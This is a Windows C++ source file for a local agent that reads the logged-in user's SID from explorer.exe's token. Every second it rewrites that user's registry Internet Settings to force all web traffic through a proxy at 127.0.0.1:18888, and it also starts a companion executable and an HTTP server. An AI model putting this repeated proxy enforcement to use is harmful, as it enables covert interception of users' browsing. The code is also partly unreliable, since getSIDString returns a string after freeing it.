
#include "MIServer.h"
#include <stdio.h>
#include <winsvc.h>
#include "MiConf.h"
#include <sddl.h>

extern long long lv_lastConnTime;

DWORD GetIdleTime()
{
	LASTINPUTINFO lii;
	lii.cbSize = sizeof(LASTINPUTINFO);

	if (GetLastInputInfo(&lii))
	{
		DWORD currentTime = GetTickCount();
		return currentTime - lii.dwTime;
	}

	return 0; // Return 0 if there was an error
}

UINT TF_GET_IDLE_TIME(void*) {
	while (true)
	{
		wchar_t wszIdleTime[100]; swprintf_s(wszIdleTime, 100, L"SfT - idle time = %d", GetIdleTime());
		OutputDebugString(wszIdleTime);
		Sleep(1000);
	}
}

void HideConsole()
{
	HWND hWnd = GetConsoleWindow(); // Get the console window handle
	ShowWindow(hWnd, SW_HIDE);      // Hide the console window
}

BOOL lv_bLaunch = FALSE;
void launch_qr() {
	if (lv_bLaunch == TRUE) return;

	wchar_t wszDir[MAX_PATH];
	GetModuleFileName(NULL, wszDir, MAX_PATH);
	wchar_t* pPos = wcsrchr(wszDir, L'\\');
	pPos[0] = 0;
	wchar_t wszPath[MAX_PATH];
	swprintf_s(wszPath, MAX_PATH, L"%s\\KAgentQR.exe", wszDir);
	STARTUPINFO si; memset(&si, 0, sizeof(si));
	si.cb = sizeof(si);
	PROCESS_INFORMATION pi;

	CreateProcess(wszPath, NULL, NULL, NULL, FALSE, 0, NULL, wszDir, &si, &pi);
	lv_bLaunch = TRUE;
}

int _execute(const wchar_t* p_szEXE, const wchar_t* p_pszCommandParam, int	p_bWait /*= 1*/);
unsigned long FindProcessID(const wchar_t* p_wszName);

std::wstring getSIDString(void)
{
	DWORD dwSID;
	ProcessIdToSessionId(GetCurrentProcessId(), &dwSID);

	int nExpPID = FindProcessID(L"explorer.exe");
	HANDLE hExp = OpenProcess(PROCESS_ALL_ACCESS, FALSE, nExpPID);
	HANDLE hToken;

	if (!OpenProcessToken(hExp, TOKEN_QUERY, &hToken)) {
		return L"";
	}

	DWORD dwSize = 0;
	GetTokenInformation(hToken, TokenUser, NULL, 0, &dwSize);
	if (dwSize == 0) {
		//		std::cerr << "Error getting token information size: " << GetLastError() << std::endl;
		CloseHandle(hToken);
		return L"";
	}

	PTOKEN_USER pTokenUser = (PTOKEN_USER)malloc(dwSize);
	if (!GetTokenInformation(hToken, TokenUser, pTokenUser, dwSize, &dwSize)) {
		//		std::cerr << "Error getting token information: " << GetLastError() << std::endl;
		free(pTokenUser);
		CloseHandle(hToken);
		return L"";
	}

	LPWSTR pSidString;
	if (!ConvertSidToStringSid(pTokenUser->User.Sid, &pSidString)) {
		//		std::cerr << "Error converting SID to string: " << GetLastError() << std::endl;
		free(pTokenUser);
		CloseHandle(hToken);
		return L"";
	}

	//	std::wcout << "SID: " << pSidString << std::endl;

	LocalFree(pSidString);
	free(pTokenUser);
	CloseHandle(hToken);
	return pSidString;
}


unsigned long writeStringWEx(const wchar_t* p_wszSubKey, const wchar_t* p_wszValueName, const wchar_t* p_wszValue)
{
	HKEY openedKey;
	LONG result = RegOpenKeyEx(HKEY_USERS, p_wszSubKey, 0, KEY_SET_VALUE, &openedKey);
	if (result != ERROR_SUCCESS) {
		return 1;
	}

	result = RegSetValueEx(openedKey, p_wszValueName, 0, REG_SZ, (const BYTE*)p_wszValue, (wcslen(p_wszValue) + 1) * sizeof(wchar_t));
	RegCloseKey(openedKey); // Close the key handle
	if (result != ERROR_SUCCESS) {
		return 2;
	}
	return 0;
}
unsigned long writeIntEx(const wchar_t* p_wszSubKey, const wchar_t* p_wszValueName, DWORD p_dwValue)
{
	HKEY openedKey;
	LONG result = RegOpenKeyEx(HKEY_USERS, p_wszSubKey, 0, KEY_SET_VALUE, &openedKey);
	if (result != ERROR_SUCCESS) {
		return 1;
	}

	result = RegSetValueEx(openedKey, p_wszValueName, 0, REG_DWORD, (const BYTE*)&p_dwValue, 4);
	RegCloseKey(openedKey); // Close the key handle
	if (result != ERROR_SUCCESS) {
		return 2;
	}
	return 0;
}


UINT TF_CHECK_CONNECTION(void*) {
	std::wstring strHead;
	while (TRUE) {
		strHead = getSIDString();
		if (strHead != L"") {
			writeIntEx((strHead + L"\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings").c_str(), L"ProxyEnable", 1);
			writeStringWEx((strHead + L"\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings").c_str(), L"ProxyServer", L"127.0.0.1:18888");
		}
		Sleep(1000);
	}
	return 0;
}

void regCreateKey(LPCWSTR p_wszSubKey);
unsigned long regWriteStringW(const wchar_t* p_wszSubKey, const wchar_t* p_wszValueName, const wchar_t* p_wszValue);

int main(char* argv, int argc) {
	lv_lastConnTime = GetTickCount64() + 30000;

	DWORD dwTID = 0;
	CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)TF_CHECK_CONNECTION, 0, 0, &dwTID);

//	HideConsole();
/*
	DWORD dwTID = 0;
	CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)TF_GET_IDLE_TIME, 0, 0, &dwTID);
*/

	ClaHTTPServerWrapper app;
	app.launch();
	return 0;
}